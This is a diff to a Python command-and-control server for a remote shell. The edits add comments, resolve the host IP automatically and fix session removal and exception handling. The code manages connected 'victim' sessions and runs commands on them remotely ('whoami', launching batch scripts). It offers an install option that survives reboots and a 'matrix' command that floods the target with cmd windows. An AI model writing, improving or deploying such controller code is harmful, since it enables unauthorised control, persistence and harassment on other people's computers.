@@ -3,8 +3,8 @@ import socket as s
 from time import sleep
 
 # constant ports:
-# by default your localport(change if neaded)
-HOST = "10.0.0.8"
+# by default your localport(change if neaded):
+HOST = s.gethostbyname(s.gethostname())
 # change port to your need:
 PORT = 420
 # -------------don't change anything from here if you don't know what you are doing-------------
@@ -19,12 +19,14 @@ server.bind(ADDR)
 sessions = {}
 session_ids = []
 
+# saves all the command
 COMMANDS = ["help", "sessions"]
 SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect"]
 
 
 class Commands:
     def __init__(self):
+        # the help message
         self.helpmsg = """
         All sessions scripts with a "(p)" at the end need the shell to be installed the ones with the "(t)" can be used without installation
         menu Commands:
@@ -52,6 +54,7 @@ class Commands:
                     print("there are no active sessions")
 
                 else:
+                    # gets all the sessions to print them
                     for i in sessions.items():
                         print(f"id: {i[1]['id']}   name: {i[1]['name']}")
             # checks if there are to meny arguments
@@ -80,7 +83,7 @@ class Commands:
                         confirm = input(f"are you sure you want to dellete {sessionInfo['name']}[y|n]")
                         if confirm == "y":
                             sessions.pop(args[1])
-                            session_ids.pop(int(args[1]))
+                            session_ids.remove(args[1])
                             print(f"delleted {sessionInfo['name']}")
                         elif confirm == "n":
                             mainMenu()
@@ -116,9 +119,11 @@ class Commands:
             # sends the message length
             message_length = str(len(msg)).encode(FORMAT)
             message_length += b" " * (BUFFER - len(message_length))
+            # sends the buffered message length
             conn.send(message_length)
-
+            # sends the message
             conn.send(msg.encode(FORMAT))
+            # checks if the sended command wants an input
             if msg[2] == "o":
                 returned = receiveMessage()
                 return returned
@@ -155,22 +160,23 @@ class Commands:
                 pcAndUsername = sendMessage("c o whoami")
                 pcAndUsernameLst = pcAndUsername.replace("\r\n", "").split("\\")
                 username = pcAndUsernameLst[1]
-
+                # sends the matrix.bat script
                 with open("extraScripts/matrix.bat", "r") as file:
                     sendMessage(file.read())
                 name = receiveMessage()
-
+                # opens the cmd window args[0] times on the pc
                 for i in range(int(args[0])):
                     sendMessage(f"c n start cmd /c C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}")
                     sleep(0.1)
 
                 return
             elif not args:
-                print("you need an argument type help for more")
+                print("you need an argument type 'help' for more")
                 return
             else:
                 print("Those are too many arguments only one is allowed")
                 return
+        # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
             sendMessage("!dsc")
             conn.close()
@@ -187,10 +193,11 @@ def sessionInput(conn, addr, name, decId):
     :param decId: the id of the session in the list
     """
     decId = str(decId)
+    # checks if to shell is still connected
     try:
         command = input(f"command({name}): ")
         commandLst = command.split(" ")
-
+        # checks if the input is in the session commands
         if commandLst[0] in SESSION_COMMANDS:
             scom = Commands()
             if len(commandLst) > 1:
@@ -205,7 +212,7 @@ def sessionInput(conn, addr, name, decId):
 
         else:
             sessionInput(conn, addr, name, decId)
-    except ConnectionResetError or ConnectionAbortedError:
+    except (ConnectionResetError, ConnectionAbortedError):
         sessions.pop(decId)
         session_ids.remove(decId)
         print("The client is no longer connected")
@@ -222,6 +229,7 @@ def mainMenu():
     # checks if the command exist
     if commandLst[0] in COMMANDS:
         com = Commands()
+        # checks if there are arguments
         if len(commandLst) > 1:
             com.mainMenu(commandLst[0], commandLst[1:len(commandLst)])
         else:
